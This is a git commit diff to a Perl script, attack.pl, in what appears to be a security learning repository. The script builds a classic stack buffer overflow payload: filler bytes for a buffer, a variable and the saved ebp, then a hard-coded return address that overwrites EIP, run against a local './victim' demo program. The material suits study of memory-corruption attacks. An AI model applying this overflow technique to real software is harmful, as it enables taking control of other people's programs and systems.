f641e39efbab484c72c6157585420d00d0f26302
Shawn the R0ck <citypw@gmail.com>
2012-11-06 20:47:19 +0800

    make the Perl version work

--- security/shellcode/overwrite_eip/attack.pl
+++ security/shellcode/overwrite_eip/attack.pl
@@ -4,12 +4,9 @@
 # It's also GPL'ed:-\
 
 
-$code = "";
-$code += "\x41" x 10;   #buf, fill with 'A'
-$code += "\x42" x 4;	#variable "x", fill with 'B'
-$code += "\x43" x 4;	# ebp, fill with 'C' 
-$code += "\x82\x84\x04\x08"; #eip, change the correct address for your machine 
+$code = "\x41" x 10;   #buf, fill with 'A'
+$code .= "\x42" x 4;	#variable "x", fill with 'B'
+$code .= "\x43" x 4;	# ebp, fill with 'C' 
+$code .= "\x82\x84\x04\x08"; #eip, change the correct address for your machine 
 
-$ret = `./victim $code`;
-
-print $ret . "\n";
+system("./victim $code");
